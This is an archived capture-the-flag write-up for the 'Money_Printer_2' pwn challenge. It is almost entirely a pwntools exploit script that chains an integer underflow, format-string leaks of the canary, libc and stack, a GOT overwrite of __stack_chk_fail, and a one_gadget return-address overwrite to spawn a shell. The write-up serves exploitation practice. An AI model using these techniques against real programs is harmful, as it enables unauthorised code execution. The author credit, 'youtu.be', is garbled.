# Money_Printer_2

**CTF:** SanDiego 2023  
**Category:** pwn  
**Original writeup:** <https://youtu.be/5miWo7IBnHI?t=604> — by **youtu.be**. All credit goes to the original author; this is an archived copy.

---

elf = pwn.ELF("./money-printer2_patched")

pwn.context.binary = elf

pwn.context.log_level = "DEBUG"

pwn.context(terminal=['tmux', 'split-window', '-h'])

libc = pwn.ELF("./libc.so.6")

def wrapper(_):

try:

run()

except Exception as e:

print(e)

return False

return True

def run():

# Remote

# p = pwn.remote("greed.sdc.tf", "1337")

# Local

# p = elf.process()

# pwn.gdb.attach(p, "b *main+360")

# Step 0: integer underflow

p.sendlineafter(b"want", "-100000000")

# Step 1: Corrupt the stack canary

payload = b"%c" * 24 + b"%hn%51$n%21$p%23$p%25$p|" # %20$hn"

# Step 2: Overwrite __stack_chk_fail with main

payload += b"%1950c||"

payload += b"%19$hn||"

payload += pwn.p64(elf.got["__stack_chk_fail"])

# Step 2.5: Send payload and get leaks

p.sendlineafter("audience?", payload)

p.recvuntil("0x")

canary = int(p.recvuntil("0x", drop=True), 16)

libc_leak = int(p.recvuntil("0x", drop=True), 16) - (0x7F3262F5DC87 - 0x7F3262F3C000)

stack_leak = int(p.recvuntil("|", drop=True), 16) - (0x7FFC33E534E8 - 0x7FFC33E53408)

one_gadet = libc_leak + [0x4F2A5, 0x4F302, 0x10A2FC][0]

print("canary: ", hex(canary))

print("libc leak: ", hex(libc_leak))

print("stack leak: ", hex(stack_leak))

print("one_gadget: ", hex(one_gadet))

# Step 3: Wait for main to be called (this will throw most of the time)

p.sendlineafter(b"want", "-100000000")

# Step 4: Overwrite ret with one_gadget

writes = {stack_leak: one_gadet}

payload = pwn.fmtstr_payload(8, writes, write_size="short")

p.sendlineafter("audience?", payload)

p.recv(4096)

p.sendline("cat flag.txt")

p.sendline("echo 'WINNER'")

f = open("winner.txt", "wb")

f.write(p.recvuntil("WINNER"))

f.close()

# run()

pwn.util.iters.mbruteforce(wrapper, alphabet=string.printable, length=8, method="fixed", threads=32)
